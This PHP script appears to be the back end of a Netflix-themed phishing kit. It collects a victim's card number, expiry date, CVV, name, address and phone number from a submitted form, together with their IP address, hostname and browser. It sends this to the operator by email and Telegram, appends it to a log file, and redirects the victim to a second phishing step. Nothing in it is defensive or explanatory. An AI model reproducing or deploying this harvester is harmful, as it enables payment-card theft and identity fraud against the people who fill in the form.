<?php
include_once 'functions.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

	/*
	/ -> Thanks for Willy
	/ -> https://www.facebook.com/willymain0/
	*/
	

	// ================================= //

	$yours = "";
	
	$message .= "=============Full CC Netflix 📺==============\n";
$message .= "CC Number              : ".$_POST['cnm']."\n";
$message .= "Exp Date                 : ".$_POST['exp']."\n";
$message .= "CVV                 : ".$_POST['csc']."\n";
$message .= "Full Name                 : ".$_POST['fnm']."\n";
$message .= "Address                 : ".$_POST['adr']."\n";
$message .= "Zip Code                 : ".$_POST['zip']."\n";
$message .= "City                 : ".$_POST['cty']."\n";
$message .= "State                 : ".$_POST['stt']."\n";
$message .= "Country                 : ".$_POST['cnt']."\n";
$message .= "Phone                 : ".$_POST['phn']."\n";

$message .= "======================INFOS================\n";
$message .= "Ip              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "BROWSER     : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "=================By willy 🔥 =============\n";
$send = "";
$subject = "LOOOOG | $ip ";
$headers = "From:IDENTIFIANTE <bendamohamo@gmail.com>>";
mail($send,$subject,$message,$headers);
$file = fopen('', 'a');
fwrite($file,$message);
telegram_send(urlencode($message));
header("Location: step2.php");


	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}

?>